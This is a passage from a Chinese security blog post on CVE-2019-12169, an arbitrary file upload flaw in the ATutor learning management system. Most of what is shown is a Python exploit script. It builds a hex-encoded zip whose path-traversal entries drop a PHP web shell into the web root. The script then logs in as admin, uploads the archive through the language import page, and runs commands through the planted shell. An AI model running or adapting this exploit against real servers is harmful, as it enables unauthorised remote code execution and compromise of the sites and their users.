data += &quot;\x14\xef\x90\xe2\xf4\x80\x2a\x13\x3f\xe7\x74\x5b\x5b\x25\x4d&quot;
data += &quot;\x4d\x6b\x05\x7b\x3b\x00\x50\x4b\x01\x02\x14\x03\x14\x00\x00&quot;
data += &quot;\x00\x08\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00&quot;
data += &quot;\x6a\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
data += &quot;\x00\x80\x01\x00\x00\x00\x00\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e&quot;
data += &quot;\x5c\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e\x2f\x78\x61\x6d\x70\x70&quot;
data += &quot;\x5c\x68\x74\x64\x6f\x63\x73\x5c\x6c\x69\x71\x75\x69\x64\x73&quot;
data += &quot;\x6b\x79\x2e\x70\x68\x70\x50\x4b\x01\x02\x14\x03\x14\x00\x00&quot;
data += &quot;\x00\x08\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00&quot;
data += &quot;\x6a\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
data += &quot;\x00\x80\x01\xb4\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e&quot;
data += &quot;\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x76\x61\x72\x2f\x77&quot;
data += &quot;\x77\x77\x2f\x68\x74\x6d\x6c\x2f\x6c\x69\x71\x75\x69\x64\x73&quot;
data += &quot;\x6b\x79\x2e\x70\x68\x70\x50\x4b\x05\x06\x00\x00\x00\x00\x02&quot;
data += &quot;\x00\x02\x00\xb4\x00\x00\x00\x68\x01\x00\x00\x00\x00\x0d\x0a&quot;
data += &quot;\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d&quot;
data += &quot;\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x43&quot;
data += &quot;\x56\x45\x32\x30\x31\x39\x31\x32\x31\x36\x39\x0d\x0a\x43\x6f&quot;
data += &quot;\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69&quot;
data += &quot;\x6f\x6e\x3a\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61\x3b\x20&quot;
data += &quot;\x6e\x61\x6d\x65\x3d\x22\x73\x75\x62\x6d\x69\x74\x22\x0d\x0a&quot;
data += &quot;\x0d\x0a\x49\x6d\x70\x6f\x72\x74\x0d\x0a\x2d\x2d\x2d\x2d\x2d&quot;
data += &quot;\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d&quot;
data += &quot;\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x43\x56\x45\x32\x30\x31&quot;
data += &quot;\x39\x31\x32\x31\x36\x39\x2d\x2d\x0d\x0a&quot;


#reverse shell url
shell = &quot;http://&quot; + target + &quot;/liquidsky.php?language=&quot; + commands

# Generate Hash
def gen_hash(passwd, token):
        m= hashlib.sha1()
        m.update(passwd + token)
        return m.hexdigest()
 
def we_can_get_jiggy_with_the_pass():

# Run pass through SHA1
     hash_object = hashlib.sha1(password)
     hex_dig = hash_object.hexdigest()
     print &quot;[*] Got SHA1 for pass: &quot; + (hex_dig)

     targeturl = &quot;http://&quot; + target + &quot;/ATutor/login.php&quot;
     token = &quot;abc&quot;
     hashed = gen_hash(hex_dig, token)
     d = &#123;
         &quot;form_password_hidden&quot; : hashed,
         &quot;form_login&quot;: &quot;admin&quot;,
         &quot;submit&quot;: &quot;Login&quot;,
         &quot;token&quot; : token
     &#125;
     s = requests.Session()

#Logging in
     r = s.post(targeturl, data=d)
     print &quot;[+] Logging in to system as %s ...&quot; % (username)
     res = r.text

# url settings, duh
     url = &quot;http://&quot; + target + &quot;/ATutor/mods/_core/languages/language_import.php&quot;

# A similar method works for the &quot;patcher&quot; function.
    # url = &quot;http://&quot; + target + &quot;/ATutor/mods/_standard/patcher/index_admin.php&quot;

# This is &quot;the&quot; request to send the zip     
     request = s.post(url, headers=headers, data=data, verify=False)
     print &quot;[+] Sent the zip ......&quot;
     time.sleep(1)

# Grab shell dude!
     print &quot;[!] *** Remote Code Execution ***&quot;
     request = s.post(shell, verify=False)
     print &quot;[x] http://&quot; + target + &quot;/liquidsky.php?language=&quot; + commands

# Note be sure to clean up: c:\xampp\htdocs\liquidsky.php and or /var/www/html/liquidsky.php

     if &quot;Administration&quot; in res:
         return True
     return False 
 
def main():
     if we_can_get_jiggy_with_the_pass():
         print &quot;&quot;
         print &quot;[+] Success! we were able to login!&quot;
         print &quot;&quot;
         print &quot;  ^_~  got r00t?   - [liquidsky 2019]&quot;
     else:         print &quot;[-] failure!&quot; 
 
if __name__ == &quot;__main__&quot;:
     main()
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://kumamon.fun/ATutor-CVE-2019-12169/">https://kumamon.fun/ATutor-CVE-2019-12169/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/fuzzlove/ATutor-2.2.4-Language-Exploit">https://github.com/fuzzlove/ATutor-2.2.4-Language-Exploit</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/ATutor/%EF%BC%88CVE-2019-12169%EF%BC%89ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmxp0037y8v1eexx8von" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Beescms/Beescms_v4.0%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Atlassian%20Jira/%EF%BC%88CVE-2019-8451%EF%BC%89Atlassian%20Jira%20%E6%9C%AA%E6%8E%88%E6%9D%83SSRF%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>